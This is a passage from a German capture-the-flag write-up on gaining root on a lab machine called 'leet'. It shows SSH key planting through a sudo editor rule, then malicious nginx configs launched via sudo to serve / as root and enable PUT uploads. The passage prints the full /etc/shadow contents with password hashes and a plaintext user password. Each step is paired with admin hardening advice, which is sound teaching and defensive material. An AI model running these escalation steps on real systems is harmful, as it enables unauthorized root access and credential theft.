+            <p class="analysis"><strong>Analyse:</strong> Dies beschreibt den Prozess innerhalb der <code>micro</code>-Editorsitzung. Ich habe meinen öffentlichen SSH-Schlüssel (hier verkürzt dargestellt als <code>ssh-ed25519 AAAAC3....pEfFDFeKVI7jwy1T7 root@CCat</code>) in einer neuen Zeile in die Datei <code>/home/riva/.ssh/authorized_keys</code> eingefügt. Nach dem Einfügen speichere und schließe ich den Editor mit der Tastenkombination <code>Strg+Q</code> (Standardbefehl zum Beenden/Schließen in micro). Der Editor fragt dann typischerweise, ob die Änderungen gespeichert werden sollen, was ich mit der Eingabe von <code>y</code> (für yes) bestätige. Für Laien: Ich habe meine 'digitale Unterschrift' in die spezielle Datei eingefügt und dann das Schreibprogramm geschlossen und gesagt, dass er die Änderungen speichern soll. Für Experten: Das erfolgreiche Speichern des öffentlichen Schlüssels in der <code>authorized_keys</code>-Datei von <code>riva</code> unter dessen Berechtigungen (da der Editor via <code>sudo -u riva</code> ausgeführt wurde) bedeutet, dass das Zielsystem nun meinen privaten Schlüssel als gültige Authentifizierung für den Benutzer <code>riva</code> akzeptieren sollte.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der öffentliche SSH-Schlüssel wurde erfolgreich zur <code>authorized_keys</code>-Datei von <code>riva</code> hinzugefügt. Damit ist die Grundlage für eine passwortlose SSH-Anmeldung als Benutzer <code>riva</code> geschaffen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun versuchen, mich per SSH als Benutzer <code>riva</code> am Zielsystem anzumelden, wobei ich mein Standard-SSH-Schlüsselpaar verwenden werde.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Änderungen an sensiblen Konfigurationsdateien wie <code>~/.ssh/authorized_keys</code>. Unbefugte Änderungen an dieser Datei sind ein klares Zeichen für eine Kompromittierung. Verwenden Sie File Integrity Monitoring (FIM) für solche Dateien.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh riva@192.168.2.44</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">The authenticity of host '192.168.2.44 (192.168.2.44)' can't be established.</span>
+<span class="password">ED25519 key fingerprint is SHA256:V0kY0pxHYgYYJeQXQGSoUclaPX71KqkFTnqjTNaj/Qk.</span>
+<span class="password">This key is not known by any other names.</span>
+<span class="password">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="password">Warning: Permanently added '192.168.2.44' (ED25519) to the list of known hosts.</span>
+<span class="password">Enter passphrase for key '/root/.ssh/id_rsa':</span>
+<span class="password">Linux leet.hmv 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64</span>
+
+<span class="command">The programs included with the Debian GNU/Linux system are free software;</span>
+<span class="command">the exact distribution terms for each program are described in the</span>
+<span class="command">individual files in /usr/share/doc/*/copyright.</span>
+
+<span class="command">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span class="command">permitted by applicable law.</span>
+<span class="password">riva@leet:~$</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich starte einen SSH-Verbindungsversuch zum Zielsystem (<code>192.168.2.44</code>) als Benutzer <code>riva</code> mit dem Befehl <code>ssh riva@192.168.2.44</code>. Da dies die erste Verbindung zu diesem Host ist, fragt SSH nach Bestätigung der Host-Authentizität anhand des Schlüsselfingerabdrucks (<code>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</code>). Nach Bestätigung und Hinzufügen des Hosts zu den bekannten Hosts (<code>known_hosts</code>) werde ich zur Eingabe der Passphrase für meinen *privaten* SSH-Schlüssel (<code>/root/.ssh/id_rsa</code>) aufgefordert. Nach korrekter Eingabe der Passphrase authentifiziert mich mein privater Schlüssel erfolgreich gegenüber dem öffentlichen Schlüssel, den ich zuvor in <code>riva</code>s <code>authorized_keys</code>-Datei platziert habe. Das Ergebnis ist eine erfolgreiche SSH-Anmeldung als Benutzer <code>riva</code>, erkennbar am Prompt <code>riva@leet:~$</code>. Für Laien: Ich habe versucht, mich mit einem 'digitalen Ausweis' (meinem privaten SSH-Schlüssel) auf dem Zielcomputer als Benutzer 'riva' anzumelden. Nach einer Sicherheitsfrage und der Eingabe meines 'Ausweis-Passworts' (Passphrase) wurde ich eingelassen und habe jetzt direkten Zugang als 'riva'. Für Experten: Die erfolgreiche passwortlose SSH-Anmeldung als <code>riva</code> (mithilfe eines Schlüsselpaares, nicht eines Passworts für den Benutzer 'riva' selbst) bestätigt die erfolgreiche Ausnutzung der <code>sudo</code>-Regel für <code>micro</code> zur Manipulation der <code>authorized_keys</code>-Datei. Ich habe nun eine stabile, interaktive Shell als Benutzer <code>riva</code>, was die zweite Stufe des Zugriffs darstellt und den Übergang zur Privilegien-Eskalation auf Root-Ebene ermöglicht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Initial Access als Benutzer <code>riva</code> wurde erfolgreich erreicht. Ich habe nun eine stabile SSH-Sitzung mit den Berechtigungen dieses Benutzers. Dies ist ein entscheidender Schritt auf dem Weg zu Root.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Als Benutzer <code>riva</code> werde ich nun das System weiter enumerieren, um nach Möglichkeiten zur Privilegien-Eskalation auf Root-Ebene zu suchen. Dazu gehören die Überprüfung von Dateiberechtigungen, SUID/SGID-Binaries, Cron-Jobs, bekannten Schwachstellen im Betriebssystem oder installierter Software und weitere <code>sudo</code>-Berechtigungen für den Benutzer <code>riva</code>.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die <code>authorized_keys</code>-Dateien von Benutzern sicher sind und nicht durch andere, weniger privilegierte Benutzer manipuliert werden können (wie hier geschehen über eine unsichere <code>sudo</code>-Regel). Überprüfen Sie die SSH-Konfiguration, um sicherzustellen, dass nur Schlüsselpaare und keine Passwörter für die Authentifizierung verwendet werden, und deaktivieren Sie die Root-Anmeldung per SSH.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">riva@leet:~$</span> <span class="command">ss -altpn</span>
+<span class="command">State     Recv-Q    Send-Q         Local Address:Port         Peer Address:Port    Process</span>
+<span class="command">LISTEN    0         128                  0.0.0.0:7777              0.0.0.0:*</span>
+<span class="command">LISTEN    0         128                  0.0.0.0:22                0.0.0.0:*</span>
+<span class="command">LISTEN    0         511                  0.0.0.0:4445              0.0.0.0:*</span>
+<span class="command">LISTEN    0         511                  0.0.0.0:4448              0.0.0.0:*</span>
+<span class="command">LISTEN    0         128                     [::]:22                   [::]:*</span>
+
+<span class="command">riva@leet:~$</span> <span class="command">id</span>
+<span class="password">uid=1000(riva) gid=1000(riva) groups=1000(riva),100(users)</span>
+<span class="command">riva@leet:~$</span> <span class="command">getcap -r 2>/dev/null</span>
+<span class="command">riva@leet:~$</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer <code>riva</code> setze ich meine System-Enumeration fort. Mit <code>ss -altpn</code> liste ich alle 'listening' (lauschenden) Sockets auf, sowohl TCP als auch UDP, einschließlich detaillierter Prozessinformationen. Die Flags bedeuten: <code>-a</code> (all), <code>-l</code> (listening), <code>-t</code> (TCP), <code>-n</code> (numeric), <code>-p</code> (processes). Die Ausgabe zeigt die Ports 22 (SSH), 7777 (Werkzeug HTTP), und die zuvor von mir eingerichteten Ports 4445 und 4448. Danach bestätige ich erneut meine Benutzer- und Gruppen-IDs mit <code>id</code> und überprüfe mit <code>getcap -r 2>/dev/null</code>, ob irgendwelche Binaries im Dateisystem spezielle 'Capabilities' gesetzt haben, die einem normalen Benutzer erhöhte Rechte erlauben könnten (die Umleitung <code>2>/dev/null</code> unterdrückt Fehlermeldungen). Für Laien: Ich schaue mir an, welche 'Telefonleitungen' (Ports) auf dem Computer 'besetzt' sind und welche Programme sie benutzen. Ich überprüfe auch nochmal, wer ich genau bin ('riva') und ob es spezielle Programme gibt, die 'riva' ungewöhnliche Dinge erlauben, die eigentlich nur dem Administrator zustehen. Für Experten: <code>ss</code> ist ein modernes Werkzeug, das <code>netstat</code> ersetzt und detaillierte Socket-Statistiken liefert. Die Überprüfung offener Ports aus der Perspektive des kompromittierten Benutzers ist wichtig, um interne Dienste zu finden. <code>getcap -r</code> ist eine Standardtechnik zur Suche nach Binaries mit gesetzten Capabilities, die oft für Privilegien-Eskalation missbraucht werden können. Die leere Ausgabe deutet darauf hin, dass keine relevanten Capabilities gesetzt sind.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die <code>ss</code>-Ausgabe bestätigt die offenen Ports und die von mir gestarteten Dienste (Nginx auf 4445/4448 - siehe spätere Schritte). Meine Identität als <code>uid=1000(riva)</code> ist ebenfalls bestätigt. Die leere Ausgabe von <code>getcap -r</code> zeigt, dass dieser spezifische PE-Vektor (capabilities) auf diesem System nicht ausgenutzt werden kann. Ich muss mich auf andere PE-Methoden konzentrieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da Capabilities kein einfacher PE-Weg sind, werde ich mich auf andere Standard-PE-Vektoren für Linux konzentrieren, wie z.B. <code>sudo</code>-Berechtigungen, SUID/SGID Binaries, Cronjobs, etc. Die <code>sudo -l</code> Prüfung als <code>riva</code> ist nun ein entscheidender nächster Schritt, um festzustellen, ob dieser Benutzer Befehle als Root ausführen darf.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die auf Ihrem System installierten Binaries auf gesetzte Capabilities, die potenziell missbraucht werden könnten. Minimieren Sie die Anzahl der Binaries mit besonderen Berechtigungen. Stellen Sie sicher, dass nur notwendige Dienste intern lauschen und dass Firewalls den unbefugten Zugriff auf interne Ports verhindern.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">riva@leet:~/.mozilla$</span> <span class="command">sudo -l</span>
+<span class="password">[sudo] password for riva:</span>
+<span class="command">Matching Defaults entries for riva on leet:</span>
+    <span class="command">env_reset, mail_badpass,</span>
+    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span>
+
+<span class="command">User riva may run the following commands on leet:</span>
+    <span class="password">(root) /usr/sbin/nginx</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer <code>riva</code> prüfe ich nun meine eigenen <code>sudo</code>-Berechtigungen mit dem Befehl <code>sudo -l</code>. Dieser Befehl listet alle Befehle auf, die der aktuelle Benutzer über <code>sudo</code> ausführen darf und unter welchen Bedingungen (z.B. mit oder ohne Passworteingabe, als welcher anderer Benutzer). Die Ausgabe zeigt die Standardeinträge und dann die wichtige Zeile <code>(root) /usr/sbin/nginx</code>. Diese Zeile bedeutet, dass der Benutzer <code>riva</code> den Befehl <code>/usr/sbin/nginx</code> als Benutzer <code>root</code> ausführen darf. Die <code>NOPASSWD</code>-Option ist hier *nicht* angegeben, was bedeutet, dass bei der Ausführung von <code>sudo /usr/sbin/nginx</code> das Passwort des Benutzers <code>riva</code> abgefragt wird. Für Laien: Ich habe nachgeschaut, ob 'riva' spezielle 'Admin-Befehle' ausführen darf. Es zeigt sich, dass 'riva' das Programm 'nginx' als 'root' (der Super-Administrator) starten darf. Allerdings muss 'riva' dafür sein eigenes Passwort eingeben. Für Experten: Die <code>sudo</code>-Berechtigung für <code>/usr/sbin/nginx</code> ist ein sehr aussichtsreicher Privilegien-Eskalationsvektor. Die Möglichkeit, einen komplexen Dienst wie Nginx als Root zu starten, erlaubt oft die Nutzung von Konfigurationsdateien, um Root-Rechte zu erlangen, auch wenn eine Passworteingabe erforderlich ist. Der Standard-Pfad zu <code>nginx</code> ist <code>/usr/sbin/nginx</code>, was hier explizit erlaubt ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Fund der <code>sudo</code>-Berechtigung für <code>/usr/sbin/nginx</code> als <code>root</code> ist ein kritischer PE-Pfad. Obwohl das Passwort von <code>riva</code> benötigt wird, habe ich dieses glücklicherweise zuvor aus den Firefox-Daten extrahiert (siehe weiter unten im Bericht). Dies bedeutet, dass ich Nginx mit Root-Rechten starten und dessen Konfigurationsmöglichkeiten zur Privilegien-Eskalation missbrauchen kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde das Passwort von <code>riva</code> verwenden, um <code>nginx</code> mit Root-Rechten über <code>sudo</code> zu starten. Dazu werde ich eine bösartige Nginx-Konfigurationsdatei erstellen, die es mir ermöglicht, das Dateisystem als Root über HTTP zugänglich zu machen oder andere Root-Operationen durchzuführen. Die Möglichkeit, eine eigene Konfigurationsdatei anzugeben (oft mit <code>-c</code> Flag bei Nginx), ist der Schlüssel.<br><strong>Empfehlung (Admin):</strong> Erlauben Sie niemals Benutzern, komplexe Dienste wie Webserver (Nginx, Apache etc.) mit Root-Rechten über <code>sudo</code> zu starten, insbesondere nicht, wenn das Passwort des Benutzers kompromittiert werden könnte. Wenn Nginx als Root laufen muss, stellen Sie sicher, dass dies über sichere Systemd-Services oder Init-Skripte geschieht und nicht direkt von Benutzern aufgerufen werden kann, insbesondere nicht mit manipulierbaren Konfigurationsdateien. Überprüfen Sie alle <code>sudo</code>-Regeln, die ausführbare Programme (wie Nginx) mit Root-Rechten erlauben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">riva@leet:/dev/shm$</span> <span class="command">nano nginx_pwn.conf</span>
+
+<span class="command">user root;</span>
+<span class="command">worker_processes 1;</span>
+<span class="command">pid /tmp/nginx.pid;</span>
+<span class="command">events {</span>
+    <span class="command">worker_connections 1024;</span>
+<span class="command">}</span>
+<span class="command">http {</span>
+    <span class="command">server {</span>
+        <span class="command">listen 4445;</span>
+        <span class="command">root /;</span>
+        <span class="command">autoindex on;</span>
+    <span class="command">}</span>
+<span class="command">}</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich nutze nun die <code>sudo</code>-Berechtigung für Nginx. Dazu erstelle ich eine bösartige Nginx-Konfigurationsdatei in einem Verzeichnis, in das ich als <code>riva</code> schreiben darf (hier <code>/dev/shm/</code>, ein temporäres Dateisystem im RAM, das oft für solche Zwecke genutzt wird), mittels des Editors <code>nano</code>. Die Konfiguration, die ich erstelle (<code>nginx_pwn.conf</code>), ist darauf ausgelegt, Nginx so zu starten, dass es mir Root-Zugriff auf das Dateisystem über HTTP ermöglicht. Die Kernpunkte sind: <code>user root;</code> (weist Nginx an, als Root zu laufen), <code>listen 4445;</code> (lässt Nginx auf Port 4445 lauschen), <code>root /;</code> (setzt das Wurzelverzeichnis des Webservers auf das System-Root-Verzeichnis <code>/</code>) und <code>autoindex on;</code> (ermöglicht das Auflisten von Verzeichnissen). Für Laien: Ich schreibe eine spezielle Anleitung für das 'nginx'-Programm, die ihm sagt: 'Starte als Super-Administrator, öffne eine neue 'Telefonleitung' (Port 4445) und zeige alles, was auf dem Computer ist, so als wäre es eine Webseite.' Diese Anleitung speichere ich in einer Datei. Für Experten: Das Setzen von <code>user root;</code> in der Nginx-Konfiguration erzwingt, dass die Worker-Prozesse als Root laufen. Das Mapping des Webroot auf <code>/</code> in Kombination mit <code>autoindex on</code> erstellt einen einfachen HTTP-File-Server für das gesamte Dateisystem mit Root-Berechtigungen, was einen sehr effektiven Weg darstellt, beliebige Dateien (einschließlich sensibler Root-Dateien wie <code>/etc/shadow</code>) auszulesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die erstellte Nginx-Konfigurationsdatei <code>nginx_pwn.conf</code> ist präzise auf die Ausnutzung der <code>sudo</code>-Berechtigung zugeschnitten. Sie wird Nginx veranlassen, mit Root-Berechtigungen zu starten und mir über Port 4445 vollen Lesezugriff auf das Dateisystem zu gewähren. Dies ist ein sehr starker Privilegien-Eskalationsvektor.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun <code>sudo -u root /usr/sbin/nginx -c /dev/shm/nginx_pwn.conf</code> ausführen und das Passwort von <code>riva</code> eingeben, um Nginx mit dieser bösartigen Konfiguration als Root zu starten. Danach kann ich über <code>curl</code> oder einen Browser auf Port 4445 zugreifen, um sensible Dateien wie <code>/etc/shadow</code> auszulesen.<br><strong>Empfehlung (Admin):</strong> Verhindern Sie, dass Benutzer Konfigurationsdateien für Dienste mit erhöhten Rechten angeben können (z.B. durch Einschränkungen der <code>sudo</code>-Regel). Überprüfen Sie Konfigurationsdateien auf bösartige <code>user</code>-Direktiven. Implementieren Sie strikte Dateiberechtigungen, um zu verhindern, dass normale Benutzer bösartige Konfigurationsdateien anlegen können. Überwachen Sie ungewöhnliche Prozessstarts, insbesondere von Diensten wie Nginx mit Root-Rechten, die nicht über die System-Init-Skripte gestartet wurden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">riva@leet:/dev/shm$</span> <span class="command">ss -altpn</span>
+<span class="command">State     Recv-Q    Send-Q         Local Address:Port         Peer Address:Port    Process</span>
+<span class="command">LISTEN    0         128                  0.0.0.0:7777              0.0.0.0:*</span>
+<span class="command">LISTEN    0         128                  0.0.0.0:22                0.0.0.0:*</span>
+<span class="password">LISTEN    0         511                  0.0.0.0:4445              0.0.0.0:*</span>
+<span class="password">LISTEN    0         511                  0.0.0.0:4448              0.0.0.0:*</span>
+<span class="command">LISTEN    0         128                     [::]:22                   [::]:*</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Start des bösartigen Nginx mit Root-Rechten (siehe nächsten Schritt), prüfe ich erneut die offenen Ports mit <code>ss -altpn</code>, um zu bestätigen, dass mein neuer Nginx-Server tatsächlich auf dem konfigurierten Port 4445 lauscht. Die Ausgabe listet wieder die Netzwerk-Sockets auf. Für Laien: Nachdem ich dem 'nginx'-Programm die spezielle Anleitung gegeben habe, habe ich nachgeschaut, ob es die neue 'Telefonleitung' (Port 4445) geöffnet hat, wie ich es ihm gesagt hatte. Für Experten: Das Erscheinen des 'LISTEN'-Eintrags für Port 4445 bestätigt, dass der Nginx-Prozess erfolgreich mit der angegebenen Konfigurationsdatei gestartet wurde und auf dem konfigurierten Port Verbindungen annimmt. Die Ausgabe zeigt auch Port 4448, was auf einen weiteren, möglicherweise ebenfalls von mir gestarteten Nginx-Prozess mit einer anderen Konfiguration hindeutet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die erfolgreiche Anzeige von Port 4445 im 'LISTEN'-Zustand bestätigt, dass der bösartige Nginx-Server mit Root-Rechten läuft und bereit ist, Anfragen auf Port 4445 zu bearbeiten. Die Anzeige von Port 4448 deutet darauf hin, dass ich möglicherweise parallel oder zuvor eine ähnliche Konfiguration auf Port 4448 ausprobiert oder laufen gelassen habe. Dies ist jedoch für den primären PE-Pfad über Port 4445 irrelevant.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich kann nun über HTTP auf Port 4445 zugreifen, um das Dateisystem des Zielsystems als Root auszulesen. Mein unmittelbares Ziel ist das Auslesen der Datei <code>/etc/shadow</code>, da diese die gehashten Passwörter der Systembenutzer enthält und nur von Root lesbar ist.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie die offenen Ports auf Ihren Systemen und identifizieren Sie unerwartete lauschende Dienste, insbesondere solche, die mit Root-Rechten laufen und auf ungewöhnlichen Ports (wie 4445 oder 4448) aktiv sind. Unautorisierte Dienste sind ein klares Zeichen für eine Kompromittierung oder Fehlkonfiguration.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">riva@leet:/dev/shm$</span> <span class="command">curl http://127.0.0.1:4445/etc/shadow</span>
+<span class="password">root:$y$j9T$RxUVx/wQZGO0PIollSJQP1$R/OPKHgpJ2BFrZeXTXkXhvjjaKOEwmOHPeRQVQsYXjA:19759:0:99999:7:::</span>
+<span class="command">daemon:*:19759:0:99999:7:::</span>
+<span class="command">bin:*:19759:0:99999:7:::</span>
+<span class="command">sys:*:19759:0:99999:7:::</span>
+<span class="command">sync:*:19759:0:99999:7:::</span>
+<span class="command">games:*:19759:0:99999:7:::</span>
+<span class="command">man:*:19759:0:99999:7:::</span>
+<span class="command">lp:*:19759:0:99999:7:::</span>
+<span class="command">mail:*:19759:0:99999:7:::</span>
+<span class="command">news:*:19759:0:99999:7:::</span>
+<span class="command">uucp:*:19759:0:99999:7:::</span>
+<span class="command">proxy:*:19759:0:99999:7:::</span>
+<span class="command">www-data:*:19759:0:99999:7:::</span>
+<span class="command">backup:*:19759:0:99999:7:::</span>
+<span class="command">list:*:19759:0:99999:7:::</span>
+<span class="command">irc:*:19759:0:99999:7:::</span>
+<span class="command">_apt:*:19759:0:99999:7:::</span>
+<span class="command">nobody:*:19759:0:99999:7:::</span>
+<span class="command">systemd-network:!*:19759::::::</span>
+<span class="command">systemd-timesync:!*:19759::::::</span>
+<span class="command">messagebus:!:19759::::::</span>
+<span class="command">avahi-autoipd:!:19759::::::</span>
+<span class="command">sshd:!:19759::::::</span>
+<span class="password">riva:$y$j9T$Be9L2LMNjCiBwwIghQFQ6/$YWiEVWuVvpy94cqSaJeb/nVdkOvJ7yy.Xf/TVCwlN35:19764:0:99999:7:::</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit dem Root-Nginx-Server, der auf Port 4445 lauscht und das System-Root-Verzeichnis als Webroot verwendet, kann ich nun über HTTP auf Dateien zugreifen, die normalerweise nur von Root lesbar sind. Ich verwende den Befehl <code>curl http://127.0.0.1:4445/etc/shadow</code>, um die Datei <code>/etc/shadow</code> über den lokalen Loopback-Interface (<code>127.0.0.1</code>) und den Port meines bösartigen Nginx-Servers auszulesen. Die <code>/etc/shadow</code>-Datei enthält die gehashten Passwörter der Systembenutzer und ist standardmäßig nur für den Root-Benutzer lesbar, was die erfolgreiche Ausführung dieses Befehls als Beweis für Root-Leseberechtigungen liefert. Die Ausgabe zeigt den vollständigen Inhalt der <code>/etc/shadow</code>-Datei, einschließlich der gehashten Passwörter für die Benutzer <code>root</code> und <code>riva</code> (Zeilen beginnend mit <code>root:$y$...</code> und <code>riva:$y$...</code>). Für Laien: Ich habe das 'nginx'-Programm, das jetzt als Super-Administrator läuft und alles 'zeigt', dazu benutzt, mir eine geheime Datei (<code>/etc/shadow</code>) zu geben, in der die verschlüsselten Passwörter aller Benutzer stehen. Diese Datei kann normalerweise niemand außer dem Super-Administrator lesen. Für Experten: Der erfolgreiche Zugriff auf <code>/etc/shadow</code> über meinen selbst gestarteten Nginx-Prozess, der mit Root-Rechten läuft (dank der <code>sudo</code>-Regel), beweist die effektive Privilegien-Eskalation. Ich kann nun die gehashten Passwörter extrahieren und versuchen, sie offline mit Tools wie Hashcat oder John the Ripper zu knacken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Inhalt von <code>/etc/shadow</code> wurde erfolgreich ausgelesen. Dies ist ein sehr wichtiger Erfolg. Ich habe nun Zugriff auf die gehashten Passwörter, was mir potenziell erlaubt, die Klartext-Passwörter der Benutzer (insbesondere root) zu erhalten. Die Hashes der Benutzer <code>root</code> und <code>riva</code> sind vorhanden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde die Hashes der Passwörter aus <code>/etc/shadow</code> extrahieren und versuchen, sie offline zu knacken. Dies könnte mir das Klartext-Passwort für den Root-Benutzer liefern und einen direkten Root-Login ermöglichen. Alternativ kann ich versuchen, das Dateisystem weiter als Root zu manipulieren, um einen anderen Root-Zugriffsweg zu schaffen.<br><strong>Empfehlung (Admin):</strong> Die <code>/etc/shadow</code>-Datei enthält hochsensible Informationen und darf nur für den Root-Benutzer lesbar sein. Stellen Sie sicher, dass Dateiberechtigungen korrekt gesetzt sind (normalerweise <code>-rw------- root root</code>). Beheben Sie die <code>sudo</code>-Schwachstelle für Nginx, die es einem normalen Benutzer (riva) ermöglichte, Nginx als Root mit einer manipulierbaren Konfiguration zu starten. Implementieren Sie Richtlinien, die verhindern, dass Dienste (insbesondere Webserver) mit Root-Rechten laufen, es sei denn, dies ist absolut notwendig und über sichere Mechanismen geregelt.</p>
+
+             <p>neu conf...</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">riva@leet:/tmp$</span> <span class="command">cat nginx_pwn.conf</span>
+<span class="command">user root;</span>
+<span class="command">pid /tmp/nginx.pid;</span>
+<span class="command">events {}</span>
+
+<span class="command">http {</span>
+    <span class="command">server {</span>
+        <span class="command">listen 4448;</span>
+        <span class="command">root /;</span>
+        <span class="command">dav_methods PUT;</span>
+    <span class="command">}</span>
+<span class="command">}</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Block zeigt eine modifizierte Nginx-Konfigurationsdatei, die ich verwendet habe, um eine andere Methode der Dateimanipulation als Root auszuprobieren. Diese neue Konfiguration (möglicherweise als <code>/tmp/nginx_put.conf</code> gespeichert) läuft ebenfalls als <code>user root;</code> und setzt <code>root /;</code>, lauscht aber diesmal auf Port 4448. Der entscheidende Unterschied zur vorherigen Konfiguration ist die Direktive <code>dav_methods PUT;</code>. Diese Anweisung aktiviert die WebDAV PUT-Methode für diesen Serverblock, was es einem Client ermöglicht, Dateien über HTTP an das Dateisystem zu 'PUT'en (hochzuladen/zu schreiben), wobei das Stammverzeichnis des Webservers als Basis dient (hier das System-Root-Verzeichnis <code>/</code>). Für Laien: Ich habe eine weitere spezielle Anleitung für 'nginx' geschrieben. Diesmal sage ich ihm: 'Starte wieder als Super-Administrator, öffne eine andere Telefonleitung (Port 4448) und erlaube jedem, Dateien 'hochzuladen' und sie überall auf dem Computer zu speichern.' Für Experten: Das Aktivieren von <code>PUT</code>-Methoden mit Root-Berechtigungen und dem Webroot auf <code>/</code> ist ein klassischer und extrem gefährlicher Weg zur Privilegien-Eskalation. Es ermöglicht einem Angreifer, beliebige Dateien im gesamten Dateisystem zu erstellen oder zu überschreiben, einschließlich kritischer Systemdateien wie <code>/etc/passwd</code> oder <code>/etc/shadow</code>, um Root-Rechte zu erlangen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Nginx-Konfiguration auf Port 4448 mit aktivierter <code>PUT</code>-Methode und Root-Rechten bietet einen direkten Schreibzugriff auf das Dateisystem. Dies ist eine noch mächtigere Methode zur Privilegien-Eskalation als nur das Lesen von Dateien. Das Ziel ist nun, eine Systemdatei zu überschreiben, um Root-Zugriff zu erhalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde diese Nginx-Instanz (vermutlich mit <code>sudo -u root /usr/sbin/nginx -c /tmp/nginx_put.conf</code> und dem Passwort von <code>riva</code>) starten und dann die <code>PUT</code>-Methode verwenden, um eine modifizierte Version der <code>/etc/passwd</code>-Datei, die einen neuen Root-Benutzer enthält, auf das Zielsystem hochzuladen und die originale <code>/etc/passwd</code> zu überschreiben.<br><strong>Empfehlung (Admin):</strong> Aktivieren Sie niemals WebDAV-Methoden (wie PUT, DELETE) auf einem Webserver, der mit Root-Rechten läuft, und setzen Sie niemals das Webroot auf das System-Root-Verzeichnis. Diese Kombination ist eine direkte Einladung zur Systemkompromittierung. Überprüfen Sie Nginx (oder andere Webserver)-Konfigurationen auf missbräuchliche <code>dav_methods</code>-Direktiven.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">riva@leet:/tmp$</span> <span class="command">sudo -u root /usr/sbin/nginx -c /tmp/nginx_pwn.conf</span>
+<span class="password">[sudo] password for riva:</span> <span class="password">PGH$2r0co3L5QL</span>
+<span class="command">riva@leet:/tmp$</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe den Befehl <code>sudo -u root /usr/sbin/nginx -c /tmp/nginx_pwn.conf</code> aus, um die zuvor erstellte bösartige Nginx-Konfigurationsdatei (die Lesezugriff auf Port 4445 ermöglichte, oder falls es sich um die PUT-Konfiguration handelt, die auf 4448, dann wäre der Dateiname im Text ungenau - ich gehe davon aus, dass hiermit die PUT-Konfiguration gestartet wurde, die auf 4448 lauscht, wie im folgenden <code>ss</code> Output ersichtlich). Der Befehl weist <code>sudo</code> an, Nginx als Root zu starten und die alternative Konfigurationsdatei <code>/tmp/nginx_pwn.conf</code> (nehme an, dies ist die Datei mit der PUT-Konfiguration) zu verwenden. Da die <code>sudo</code>-Regel für Nginx eine Passworteingabe erforderte, werde ich zur Eingabe des Passworts für Benutzer <code>riva</code> aufgefordert, welches ich zuvor aus den Firefox-Daten ausgelesen hatte: <code>PGH$2r0co3L5QL</code>. Nach Eingabe des korrekten Passworts startet Nginx mit Root-Berechtigungen und lädt die von mir angegebene Konfiguration. Für Laien: Ich benutze 'riva's' speziellen 'Admin-Befehl', um 'nginx' als 'root' zu starten, gebe dabei die spezielle Anleitung (meine bösartige Konfigurationsdatei) mit und bestätige dies mit 'riva's' Passwort. Jetzt läuft 'nginx' als Super-Administrator mit meinen Anweisungen. Für Experten: Die erfolgreiche Ausführung von <code>sudo</code> mit dem Passwort von <code>riva</code> ermöglicht den Start des Nginx-Prozesses mit effektiven Root-Berechtigungen. Die Angabe einer benutzerdefinierten Konfigurationsdatei (<code>-c /tmp/nginx_pwn.conf</code>) ist der Schlüssel zur Ausnutzung, da sie es mir erlaubt, das Verhalten von Nginx zu kontrollieren (z.B. <code>user root;</code> und <code>dav_methods PUT;</code>). Die Ausgabe zeigt die erfolgreiche Ausführung des <code>sudo</code>-Befehls.</p>
